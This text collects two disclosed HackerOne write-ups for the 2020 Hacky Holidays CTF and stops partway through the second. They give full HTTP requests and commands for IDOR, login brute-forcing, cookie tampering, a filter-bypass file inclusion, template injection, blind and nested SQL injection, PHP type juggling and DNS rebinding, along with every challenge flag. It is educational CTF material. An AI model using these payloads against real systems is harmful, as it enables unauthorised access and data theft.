hackyholidays.h1ctf.com/attack-box/challenge-completed-a3c589ba2709
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

Stay tuned!

## Impact

Critical

---

### [Hacky Holidays CTF Writeup](https://hackerone.com/reports/1066007)

- **Report ID:** `1066007`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** h1-ctf
- **Reporter:** @w--
- **Bounty:** - usd
- **Disclosed:** 2021-01-12T18:00:18.407Z
- **CVE(s):** -

**Vulnerability Information:**

## Intro:

12 days of challenges - some more challenging than others!  This holiday CTF had all 12 challenges hosted on the website https://hackyholidays.h1ctf.com/

{F1129112}

## Challenge 1:

I started by *significantly* overthinking all of the early challenges in this competition.  When this CTF started the home page did not have the "apps" button as seen in the screenshot above, and simply had the "Keep Out" image and the falling snow.

I checked the HTML source and didn't find anything much.  After checking a couple more obvious things, I started looking into the "falling snow" background, which was a `.mp4` file.  Perhaps there was a single frame with the flag in it?  Examining the file showed some interesting details like the file paths used for creating the animation (`H:\NahamSec\Grinch\Grinch Launch.aep`):

{F1129111}

Unfortunately, this challenge had nothing to do with the webpage source code, images or movie file.  The flag turned out to be in `robots.txt`!  The contents of robots.txt was:

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

This provided the first flag, and the path to the second day's challenge

## Challenge 2

The path `/s3cr3t-ar3a` returned a message "Come back tomorrow" until day 2 started.  Once the challenge kicked off, the following page could be seen:

{F1129110}

This challenge, similar to the last, was even easier than it looked.  The HTML source for the page included an innocent looking reference to `/assets/js/jquery.min.js`.  Examining this file showed that data was obfuscated into the Javascript:

{F1129109}

There was no need to deobfuscate the data however.  Examining the Javascript showed that it would write the data into the DOM of the page.  Which means that the Web Developer Inspector built in to the browser could be used to simply view the data.  This revealed the following:

```
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
```

Once again, we now have the flag for the challenge and the page for the next day.

## Challenge 3 - People Rater

The `/apps` page was used to host the next 8 challenges.  The first one (challenge 3) was the "People Rater" challenge.  This challenge displayed a list of people and the Grinch's rating of them.  Clicking a person would display the rating, which was always "Disgusting".

An intercepting proxy was used and showed that when a person was clicked, an API request similar to the following was made:

```
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6NH0=
```

The `id` parameter clearly contains Base64 encoded data.  Decoding it shows:

```
{"id":4}
```

ID 1 never appears in the list to click on, so we can manually encode it and call this API with the following URL:

https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=

This returns the following result, which includes the flag for this challenge:

```
{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

## Challenge 4 - Swag Shop

Challenge 4 was a fake web store.  There were 3 items for sale, but a login was required to purchase any items.  Attempting to brute force the login was not successful.  After trying several ways to break the web store, `wfuzz` was used with a small word list to attempt to find other pages that might not be linked.  This revealed the following page:

```
https://hackyholidays.h1ctf.com/swag-shop/api/sessions
```

This page returned a list of sessions as Base64 data:

{F1129108}

The Base64 data included a value, "Cookie" when decoded.  I initially tried to use the session data to populate my own login cookie, however this was not successful.  I even tried every single session ID!  

One of the session data strings also had the value "user": `"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043"`.  After *more* wfuzz scans I identified an endpoint `user` that accepted a parameter `uuid`.  This then allowed for a user to be looked up with the following URL:

```
https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
```

The response had the flag:

```
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
```

## Challenge 5 - Secure Login

This challenge started off very straightforward.  The challenge started with a "login" page.  Entering a test login (admin/admin) returned the error:

```
Invalid Username
```

This strongly indicates that we need to first find the correct username.  I tried an LDAP injection as a test, but this did not uncover anything.  Next I moved to a brute force attack.  This quickly showed that the username `access` could be used.  With that username, the server now returned `Invalid Password` as the message.  Bruteforcing the password field showed the password was `computer`.  

The challenge was not done here however!  After logging in, the website simply said `No Files To Download`.  Brute forcing API paths did not reveal anything.  Examining the cookie that was set after login however revealed the next step.  The cookie value was `eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0%3D`.  Base64 decoded this becomes: `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`.  I quickly changed "admin" to "true", and reencoded the cookie.  Now when accessing the file list, one file was available for download:

```
my_secure_files_not_for_you.zip
```

We still are not done!  After downloading this zip file I discovered that it is password protected.  The password turned out to be pretty easy, John The Ripper quickly found it to be `hahahaha`:

{F1129107}

This allowed flag.txt to be extracted and its value was: `flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

## Challenge 6 - My Diary

This challenge starts on the page: `https://hackyholidays.h1ctf.com/my-diary/?template=entries.html`.  The page displays a list of "diary" entries for the Grinch.  I ended up stuck on this one for waaay longer than I should have been.  The `?template=entries.html` parameter was the obvious target for attack, but changing it to any other value simply returned a `404`.  Accessing `entries.html` directly was successful, but only returned the exact same contents as the regular page.

I ran wfuzz several times with no results.  I tried path traversal attacks with some success (`?template=../` returned a blank page instead of a 404).  But still nothing.  Finally with an expanded wordlist for wfuzz I hit the parameter `?template=index.php`.  No other challenges had referenced pages with a `.php` extension, so I had not tried this for any of them.  I also ran in to an issue where Burp Intruder's filter function had a bug (which it has had forever).  The filter functionality of it incorrectly hides results while the scan is running.  It only works properly after an intruder run has completed.  Using wfuzz instead of intruder finally revealed the correct page.  The contents of the `index.php` page can be seen below:

{F1129106}

This PHP script is filtering input to block access to `secretadmin.php`  We can defeat this filter by using the following URL:

https://hackyholidays.h1ctf.com/my-diary/?template=secretadmsecretadmadmin.phpin.phpin.php

This reveals the calendar entry for the Grinch (Launch DDOS against Santa's Workshop), and the flag: `flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

## Challenge 7 - Hate Mail Generator

The Hate Mail Generator app allows users to view or create new email campaigns.  The emails can make use of a template, and the app allows users to preview templates before they are used.  This challenge immediately appeared to require a template injection attack.  The example email template had the following value in it: `{{template:cbdj3_grinch_header.html}}`.  This template directive would cause the server to return the contents of that file when loaded.

After trying several template engine attacks, I switched to instead looking at the `cbdj3_grinch_header.html` page.  I found that this was stored in a directory that could be listed:

{F1129105}

This showed there was another file `38dhs_admins_only_header.html`.  Including this file in a template was not successful however!  The server returned an error `You do not have access to the file 38dhs_admins_only_header.html`.  After trying a few different things (injecting characters that were stripped out to bypass a filter - didn't work), I found that the template file could be referenced from the template *data*.  The following `POST` request was used to reveal the contents of the file:

```
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 209
Origin: https://hackyholidays.h1ctf.com
Connection: close
Upgrade-Insecure-Requests: 1

preview_markup=yes{{template:cbdj3_/*grinch*/_header.html}}{{77}}&preview_data={"name":"admin","email":"admin@admin.com","admin":true,"administrator":true,"77":"{{template:38dhs_/*admins_only*/_header.html}}"}
```

The file contained the flag `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`

## Challenge 8 - Forum

The goal for this challenge was to get admin access to the web forum.  I tore my hair out on this one - it was super frustrating!  After doing some testing and recon on the forum I discovered the page: `https://hackyholidays.h1ctf.com/forum/phpmyadmin/`.  Brute forcing logins for the forum and the phpmyadmin page was not successful.  There was a forum user `max`.  I thought, "how strong of a password can a dog really have".  Turns out, pretty strong.

After trying *everything* (SQL injection, password brute force, hidden files, LDAP injection, more password brute force), I was ready to give up.  It turns out that the key to this challenge was not on the `hackyholidays.h1ctf.com` website at all.  There was nothing to indicate this though, and I only discovered it when looking for info on some of the later challenges.  The challenge author had uploaded the source code for the `forum` software on to Github.  This included the password for the phpmyadmin page, although it was only visible in previous commits:

https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae

Logging in with the phpmyadmin credentials (forum/6HgeAZ0qC9T6CQIqJpD) was successful.  This allowed reading of the `users` table:

{F1129103}

Cracking the Grinch's password hash (35d652126ca1706b59db02c93e0c9fbf) revealed his password to be: `BahHumbug`.  Thanks to the Crackstation wordlist :)

Logging in as the Grinch showed the flag: `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`.  It also showed the Grinch's plans - to launch a DDOS once he obtains the IP for Santa's workshop.

## Challenge 9 - Evil Quiz

The evil quiz challenge was possibly the first challenge where what I thought the solution would be actually was exactly correct right from the beginning!  There are three "pages" in the quiz app which allow a user to enter their name, enter their answers, and check their score.  I correctly guessed that this would a "second order" SQL injection vulnerability.

I *attempted* to exploit this one using the `--second-req` parameter of Sqlmap.  But in true Sqlmap fashion it just never worked :(  So I ended up debating spending an hour doing it by hand or an hour battling Sqlmap.  Not sure which was the better way to go, but I just did it by hand.

A "second order" SQL injection means that one page saves the SQL injection data, and a second page returns the data or triggers the injection to actually take place.  We can inject our data on the page `https://hackyholidays.h1ctf.com/evil-quiz` with a `POST` request.  The injection takes place in the `name` parameter.  The result can be seen on the page `https://hackyholidays.h1ctf.com/evil-quiz/score`.  

Testing showed that any `sleep` command was removed from the input, probably to stop the CTF server from dying :)  I was only successful in exploiting this vulnerability as a "Boolean Based Blind" attack, which was somewhat slow going.  It appears that the server runs a SQL query to determine how many other users have the same username.  Since a "count" is returned, extracting data directly does not appear possible.  Instead we can craft SQL queries which either return "true" or "false" to affect the count output.  The following request is an example of the `POST` request used to trigger this attack:

```
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Content-Type: application/x-www-form-urlencoded
Content-Length: 121
Origin: https://hackyholidays.h1ctf.com
Connection: close
Cookie: session=b0e2497adfcffb94cadce208c7aff1c3
Upgrade-Insecure-Requests: 1

name=test'+union+select+9,9,9,9+union+select+username,password,7,7+from+admin+where+password+like+'s3creT%25'#
```

The `union` statement in the above request causes the SQL result to either show a count of either 2 or 3.  A count of 3 will only be returned if the statement `select username,password,7,7 from admin where password like 's3creT%'` is true (which it is):

{F1129102}


Character by character the results were extracted until the full password for the `admin` user was discovered: `S3creT_p4ssw0rd-$`.  The special characters in the password threw me off for a bit - turns out MySQL doesn't know how to compare whether a `_` is lower or higher than the letter `a`.  I *also* discovered that a MySQL `like` statement does a case-insensitive compare. 

Logging in with the extracted credentials revealed the flag: `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`

## Challenge 10 - Signup Manager

Even thought this was challenge number 10 it ended up being pretty quick to complete.  The system allows for new users to be registered, but only admin users have full access.  Examining the page source showed a reference to: `https://hackyholidays.h1ctf.com/signup-manager/README.md`.  This revealed that the full source code for this challenge could be downloaded.  It also showed that a user would only be marked as `admin` if there was a `Y` in the correct user field.  By default there would be a `N`.

Examining the PHP files used for the challenge showed that `index.php` did all the main work.  Each user field (first name, last name, etc) would have a fixed size.  Anything larger would be truncated.  The exception to this was the `age` field which would take an integer value instead of a fixed length string.  Checks were in place to ensure that the age value could only be a maximum of 3 digits.  The following code handled this:

```
if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
```

After a couple of tests, I confirmed that long age values were indeed blocked.  The PHP page describing the `intval` function had the hint needed however: https://www.php.net/manual/en/function.intval.php

This page indicates that `intval(1e10);` would return `1410065408`.  Checking on PHP type handling showed that `1e10` also passes the `is_numeric` check.  Since we need only 3 digits, the value `9e9` was used instead.  This was combined with a first and last name of all `Y`, which would overflow their normal fixed position and create our account as an `admin`.  The full `POST` request used was:

```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
Origin: https://hackyholidays.h1ctf.com
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

action=signup&username=grinch1337&password=test99&age=9e9&firstname=YYYYYYYYYYYYYYYYY&lastname=YYYYYYYYYYYYYYYYY&admin=true
```

This revealed the flag for this challenge as `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`.  It also gave the URL for the next challenge:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59

## Challenge 11 - Grinch Recon

The Grinch Recon challenge was *by far* the hardest challenge in this competition.  The difficulty went from 0 to 100 with no warning!  Rather than go through the million false attempts I made, here were the steps to successfully complete this challenge:

 1. The `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album` API has a SQL injection vulnerability.  This can easily be exploited, however *nothing* sensitive is stored in the database.
2. The SQL injection can instead be used to cause the server to calculate the hash for an arbitrary image file (described below)
3. A path traversal can be used with the image file URL to target the `/api` pages instead.
4. Only two API endpoints exist, `ping` and `user`.  The `user` endpoint accepts the parameters `username` and `password`.
5. No data can be retrieved using the `image` function due to content type errors.  Instead, we can determine if the API request returns no data (code 204), or data (code 200).
6. The `user` API endpoint appears to be using a `LIKE` statement to look up users.  We can insert a `%` symbol to do a wildcard match, and then character by character extract the valid username and password.

If the above steps sound simple enough, let me assure you, *they weren't*.  At each step along the way I ended up trying at least 10 different things all of which failed.  The initial SQL injection vulnerability was super cool I thought.  Since nothing is in the database, and we need a valid "authentication hash" for the `image` function, we need to use the SQL injection to completely rewrite the SQL query output.  I used the following SQL injection to accomplish this:

`jdh34p'+union+select+'4''+union+select+3,3,''../api/user''+--+','jdh349',user()--+'`

This would result in the value `../api/user` being returned from the SQL query, and would cause the server to calculate the authentication hash needed for this value:

{F1129104}

In the above SQL injection statement there is actually a nested SQL injection.  The first injection is a `union` statement targeting the `album` table query.  The second injection is a `union` statement targeting the `photo` table query.  The server itself is first looking up the album `id` value from the album `hash` input.  The `id` is then used with a second SQL query by the server to look up the `photo` data.  Our injection to the `photo` query ends up being the value:

```
' union select 3,3,'../api/user'
```

The quotes are double encoded so that they survive the first SQL injection and make it to the second.  The end result is that we can obtain an authentication hash for any server path.  

I thought this would be the end of it, but it was the start of much more frustration.  After scripting requests using the SQL injection to obtain a value file hash, I discovered the `/api/user` endpoint.  Unfortunately the server would not return any data:

{F1129101}

Eventually I discovered that a `%` could be added to the username and password fields to extract their values character by character.  This gave:

```
username: grinchadmin
password: s4nt4sucks
```

The flag after logging in to the attack box with these credentials was: `flag{07a03135-9778-4dee-a83c-7ec330728e72}`

## Challenge 12 - Grinch Network Attack Server

This was probably the most fun challenge.  Similar to challenge 11, an "authentication hash" is needed to submit requests to the server with a target IP address.  One of the thousand things I attempted in challenge 11 was brute forcing the shared secret that might have been used with the hash creation.  While this entirely failed for challenge 11, it worked great for challenge 12:

{F1129100}

I used the following John the Ripper rules to add the input text to a wordlist and see if it matched the known hash:

```
[List.Rules:ExampleGrinch]
Az"203.0.113.53"
A0"203.0.113.53"
```

The prefix `mrgrinch463` was in the `rockyou.txt` wordlist, which for some reason remains to be an awesome wordlist for password cracking.  Now that the prefix is known, it is trivial to create a valid MD5 authentication hash for any target value.  This challenge had a super cool "attack console", but unfortunately it wasn't just as easy as attacking `localhost`:

{F1129098}

Input that resolves to `127.0.0.1` is blocked.  I correctly guessed that a DNS rebinding attack might be needed to overcome this.  An awesome, free rebinding service already exists, which is https://github.com/taviso/rbndr

Using the example DNS of `7f000001.c0a80001.rbndr.us` I tried this challenge again.  This DNS server will return `127.0.0.1` half of the time (using the subdomain listed), and `192.168.0.1` the other half of the time.  Since each time the server is called a different IP is given, my first attempt failed.  The second time was successful however!  The attack check passed, and then the DDOS targeted localhost bringing down the Grinch server:

{F1129099}


## Conclusion and Flag Summary

Overall I had a lot of fun with this CTF.  There really was only "easy/medium" and "super hard" web challenges, but it was great to complete them all!

List of flags:

flag{48104912-28b0-494a-9995-a203d1e261e7}
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
flag{99309f0f-1752-44a5-af1e-a03e4150757d}
flag{07a03135-9778-4dee-a83c-7ec330728e72}
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

## Impact

Took down the Grinch!

---

### [[CTF] I've DDoSed Grinch Network](https://hackerone.com/reports/1065493)

- **Report ID:** `1065493`
- **Severity:** Critical
- **Weakness:** Uncontrolled Resource Consumption
- **Program:** h1-ctf
- **Reporter:** @jeti
- **Bounty:** - usd
- **Disclosed:** 2021-01-11T21:29:04.813Z
- **CVE(s):** -

**Vulnerability Information:**

Hello!

Here are all 12 flags for HackyHolidays CTF:
1. flag{48104912-28b0-494a-9995-a203d1e261e7}
2. flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
3. flag{b705fb11-fb55-442f-847f-0931be82ed9a}
4. flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
5. flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
6. flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
7. flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
8. flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
9. flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
10. flag{99309f0f-1752-44a5-af1e-a03e4150757d}
11. flag{07a03135-9778-4dee-a83c-7ec330728e72}
12. flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}

{F1127693}

 I will post full write-up shortly in the comment.

## Impact

Grinch Networks no longer exists!

**Summary (researcher):**

# Flag 1

First flag was the most difficult one for me because I always forget checking `robots.txt` file :)

```http
GET /robots.txt HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close


HTTP/1.1 200 OK
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```
### Flag 1: flag{48104912-28b0-494a-9995-a203d1e261e7}

# Flag 2

Web page https://hackyholidays.h1ctf.com/s3cr3t-ar3a was stating *'come back tomorrow'*. So on next day when we visit it we are greeted with following message:
{F1127095}

Let's check the source code. Nothing very exciting... Except this part:
```html
<script src="/assets/js/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
```
All files (CSS, JS) are hosted from Content Delivery Network **except JQuery**. After checking the source code of locally hosted *jquery.min.js* we can find this added code:

```javascript
      , h1_0 = 'la'
      , h1_1 = '}'
      , h1_2 = ''
      , h1_3 = 'f'
      , h1_4 = 'g'
      , h1_5 = '{b7ebcb75'
      , h1_6 = '8454-'
      , h1_7 = 'cfb9574459f7'
      , h1_8 = '-9100-4f91-';
    document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
    document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
```
That means this part of JS modifies DOM tree with `setAttribute()`.
Let's fire up Dev Tools in Chrome to inspect DOM tree. We can immediately spot this part:
```html
<div class="alert alert-danger text-center" id="alertbox" data-info="flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}" next-page="/apps">
                <p>I've moved this page to keep people out!</p>
                <p>If you're allowed access you'll know where to look for the proper page!</p>
            </div>
```

### Flag 2: flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}

From now on all flags were new apps published under `/apps`directory.
# Flag 3 - People Rater
{F1127105}
People Rater is an app that presents ratings assigned by Grinch to various people.
When we examine the request made when specific person's rating should be presented on screen we observe this:
```http
GET /people-rater/entry?id=eyJpZCI6NH0= HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close

HTTP/1.1 200 OK

{"id":"eyJpZCI6NH0=","name":"Ruth Ward","rating":"Disgusting"}
```
String with `eyJ` prefix ? That almost always means Base64 encoded JSON!

`base64decode('eyJpZCI6NH0=')` = `{"id":7}`

We can try exploiting classic IDOR and change `id` value and pass it to the application (after base64 encoding):
`base64encode('{"id":0}')` = `eyJpZCI6MX0=`

```html
GET /people-rater/entry?id=eyJpZCI6MX0%3d HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close

HTTP/1.1 200 OK

{"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```
### Flag 3: flag{b705fb11-fb55-442f-847f-0931be82ed9a}

# Flag 4
{F1127124}

Swag Shop app as the name suggests is a shopping application. It heavily rely on API available at https://hackyholidays.h1ctf.com/swag-shop/api.
There are couple of endpoints already visible in javascript:
* /api/login
* /api/stock
* /api/purchase

Quick fuzzing with `ffuf` reveals few more:
```bash
ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w ~/wordlists/Web-Content/common.txt -mc all -ac
________________________________________________

 :: Method           : GET
 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ
________________________________________________

sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
```

First endpoint `/sessions` reveal interesting session information:
```json
{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKa[...]",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKa[...]",
"eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKa[...]"
]}
```
All strings are base64 encoded and have similar structure after decoding:
```json
{"user":null,"cookie":"YzVmNTJiYTNkOWFlYTY2YjA1ZTY1NDBlNmI0Ym[...]"}
```
One of the strings is different and has non-null `user` field:
```json
{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMW[...]"}
```

Let's check another API endpoint: `/api/user`. When accessed directly it throws an error that params are not defined:
```http
GET /swag-shop/api/user HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close

HTTP/1.1 400 Bad Request

{"error":"Missing required fields"}
```

Fuzzing param names reveal required parameter:
```bash
ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=xxx -w ~/wordlists/Web-Content/burp-parameter-names.txt -mc all -ac
________________________________________________

 :: Method           : GET
 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=xxx
________________________________________________

uuid                    [Status: 404, Size: 40, Words: 5, Lines: 1]
```

Let's use `user` value retrieved from `/api/sessions` as a value for `uuid` parameter:
 ```http
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close

HTTP/1.1 200 OK

{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
```

### Flag 4: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}

#Flag 5
{F1127212}

## Enumerating username and password
On https://hackyholidays.h1ctf.com/secure-login we are greeted with login screen.
First thing to check on any login screen is if there is a difference in error message when we provide valid username (Invalid username vs. invalid password).
If error message differs and there is no rate limiting on `login` endpoint we can enumerate valid usernames by checking for which users error message will change.

It seems that providing wrong username results in following error message:
{F1127218}

Enumerating usernames with filtering out responses with 'Invalid Username' string:
```
ffuf -u https://hackyholidays.h1ctf.com/secure-login -X POST -d "username=FUZZ&password=1" -w ~/tools/SecLists/Usernames/Names/names.txt -H "Content-Type: application/x-www-form-urlencoded" -mc all -fr "Invalid Use"
________________________________________________

 :: Method           : POST
 :: URL              : https://hackyholidays.h1ctf.com/secure-login
 :: Wordlist         : FUZZ: /home/jeti/tools/SecLists/Usernames/Names/names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=FUZZ&password=1
________________________________________________

access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
```

Enumerating password:
```
ffuf -u https://hackyholidays.h1ctf.com/secure-login -X POST -d "username=access&password=FUZZ" -w ~/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt -H "Content-Type: application/x-www-form-urlencoded" -mc all -fr "Invalid Pass"

 :: Method           : POST
 :: URL              : https://hackyholidays.h1ctf.com/secure-login
 :: Wordlist         : FUZZ: /home/jeti/tools/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=access&password=FUZZ
 :: Filter           : Regexp: Invalid Pass
________________________________________________

computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Username: **access**
Password: **computer**

After login we get following message:
{F1127660}

#Access to admin files
When we log in following cookie is assigned:
```
securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=
```
Again we have base64 encoded string:
```
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
```
After changing parameter `admin` to *true* and re-encoding cookie again we get access to admin files:
```http
GET /secure-login HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cookie: securelogin=eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ%3d%3d

HTTP/1.1 200 OK

[...]
<td><a href="/my_secure_files_not_for_you.zip">my_secure_files_not_for_you.zip</a></td>
```
{F1127760}
## Password protected ZIP
Downloaded Zip file turned out to be password protected.
Let's crack it with good old John the Ripper :)
```shell
$ zip2john my_secure_files_not_for_you.zip > zip.hash
$ john -w rockyou.txt zip.hash --format=pkzip

my_secure_files_not_for_you.zip:hahahaha
```
After unzipping the file we exctract the flag.txt:
```
$ unzip my_secure_files_not_for_you.zip
Archive:  my_secure_files_not_for_you.zip
[my_secure_files_not_for_you.zip] xxx.png password:
  inflating: xxx.png
 extracting: flag.txt

$cat flag.txt
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

### Flag5: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}

# Flag 6
{F1127768}
Immediately after visiting My diary app we see that there is a potential for Local File Inclusion (LFI) due to `template` parameter accepting local file name: https://hackyholidays.h1ctf.com/my-diary/?template=entries.html

Changing `template` parameter to `index.php` reveals PHP source code of main page:
```php

<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```
Our goal here is to access source code of `secretadmin.php` page.
Unfortunately there is a mechanism implemented that removes `admin.php` and `secretadmin.php` strings from template parameter.

As specific strings are REMOVED we can construct following string:
* secresecretadmadmin.phpin.phptadmadmin.phpin.php 
* after removing of `admin.php` -> `secresecretadmin.phptadmin.php`
* after removing of secretadmin.php ->  `secretadmin.php`

After visiting URL https://hackyholidays.h1ctf.com/my-diary/?template=secresecretadmadmin.phpin.phptadmadmin.phpin.php
we get access to flag:
{F1127769}

### Flag 6: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}

#Flag 7
{F1127770}
## Templating system
This app uses some kind of templating system to generate hate mailing campaigns.
From existing mailing campaign called `Guess What` we can get information how to include template from external file:
{F1127785}
So it's possible to include external file with `{{template:external_filename}}` syntax.

When we create new campaign and preview it's contents, following request is made:
```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Type: application/x-www-form-urlencoded

preview_markup=Hello {{name}} ....&preview_data={"name":"Alice","email":"alice@test.com"}

HTTP/1.1 200 OK

Hello Alice....
```

## Template directory
